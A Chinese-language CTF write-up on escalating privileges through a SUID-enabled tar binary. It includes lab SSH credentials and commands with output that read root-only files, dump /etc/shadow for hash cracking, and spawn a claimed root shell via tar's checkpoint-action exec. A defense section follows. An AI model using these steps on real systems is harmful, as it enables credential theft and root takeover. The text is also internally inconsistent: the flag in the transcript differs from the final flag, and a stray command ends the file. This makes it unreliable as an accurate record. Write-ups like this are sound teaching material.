# CTF Writeup: TAR SUID + DAC 提权

## 题目信息

- **难度**: 中等
- **类型**: Linux 提权 / 文件权限
- **SSH**: `ssh ctfuser@localhost -p 2222`
- **密码**: `ctfpassword`
- **目标**: 读取 `/root/flag.txt`

---

## 题目描述

> 你获得了一台服务器的普通用户权限，听说管理员把重要文件藏在了 root 目录下。你能找到 flag 吗？

---

## 信息收集

登录后先做基本枚举：

```bash
ctfuser@container:~$ ls -la
# 发现 README.txt 和 fake_flag.txt（干扰项）

ctfuser@container:~$ cat README.txt
# Hint: Sometimes the simplest tools hide the deepest secrets...

ctfuser@container:~$ id
uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)

ctfuser@container:~$ cat /root/flag.txt
cat: /root/flag.txt: Permission denied
```

尝试直接访问被拒绝，开始查找提权点。

---

## 发现漏洞

### 方法一：查找 SUID 文件

```bash
ctfuser@container:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/tar        # ← 异常！tar 不应该有 SUID
/usr/bin/passwd
/usr/bin/su
...
```

`tar` 具有 SUID 位，这意味着执行 tar 时会以 **root 身份** 运行。

### 方法二：验证 DAC 配置

```bash
ctfuser@container:~$ ls -la /usr/bin/tar
-rwsr-xr-x 1 root root ... /usr/bin/tar
#   ^ s 表示 SUID 已设置

ctfuser@container:~$ ls -la /root/
ls: cannot open directory '/root/': Permission denied

ctfuser@container:~$ ls -la /opt/secret/
ls: cannot open directory '/opt/secret/': Permission denied
```

---

## 利用过程

### 利用 TAR SUID 读取 /root/flag.txt

由于 `tar` 以 root 权限运行，可以用它打包任何文件：

```bash
# 第一步：用 tar 打包 root 目录下的 flag
ctfuser@container:~$ tar -czf /tmp/loot.tar.gz /root/flag.txt
tar: Removing leading '/' from member names

# 第二步：解压到可访问的目录
ctfuser@container:~$ tar -xzf /tmp/loot.tar.gz -C /tmp/

# 第三步：读取 flag
ctfuser@container:~$ cat /tmp/root/flag.txt
flag{t4r_s1u1d_d4c_pr1v3sc_ftw_2024}
```

### 进阶：利用 TAR 读取 /etc/shadow

```bash
ctfuser@container:~$ tar -czf /tmp/shadow.tar.gz /etc/shadow /etc/passwd
ctfuser@container:~$ tar -xzf /tmp/shadow.tar.gz -C /tmp/
ctfuser@container:~$ cat /tmp/etc/shadow
# 可见所有用户密码哈希，可用 hashcat/john 破解
```

### 进阶：利用 TAR 获取 Shell（GTFOBins 方法）

```bash
# 方法来自 GTFOBins
ctfuser@container:~$ tar -cf /dev/null /dev/null \
    --checkpoint=1 \
    --checkpoint-action=exec=/bin/bash

# 得到 root shell！
root@container:/# id
uid=0(root) gid=0(root) groups=0(root)
root@container:/# cat /root/flag.txt
flag{t4r_s1u1d_d4c_pr1v3sc_ftw_2024}
```

---

## 原理分析

### SUID 机制

```
普通执行: 进程 UID = 当前用户 UID (1000)
SUID执行: 进程 UID = 文件所有者 UID (0=root)
```

当 `/usr/bin/tar` 设置了 SUID 位：
- 任何用户执行 `tar` 时，进程以 **root** 身份运行
- tar 可以读取/写入任何 root 可访问的文件
- DAC（自主访问控制）完全失效

### DAC 失效原理

```
正常 DAC 检查:
  进程 UID(1000) vs 文件 Owner(root/0) → 拒绝

SUID 后的 DAC 检查:
  进程 UID(0/root) vs 文件 Owner(root/0) → 允许 ✓
```

---

## 防御方案

```bash
# 1. 移除 tar 的 SUID 位
chmod u-s /usr/bin/tar

# 2. 使用 sudo 替代 SUID，并限制具体命令和参数
# /etc/sudoers:
# ctfuser ALL=(root) NOPASSWD: /usr/bin/tar -czf /backup/* /home/*

# 3. 使用 AppArmor 限制 tar 的文件访问范围

# 4. 定期审计 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 5. 使用 capabilities 替代 SUID（最小权限）
setcap cap_dac_read_search+ep /usr/bin/tar  # 仍有风险，仅作示例
```

---

## Flag

```
HYNU{t4r_s1u1d_d4c_pr1v3sc_ftw_2026}
```


tar -xzf ./flag.tar.gz -O
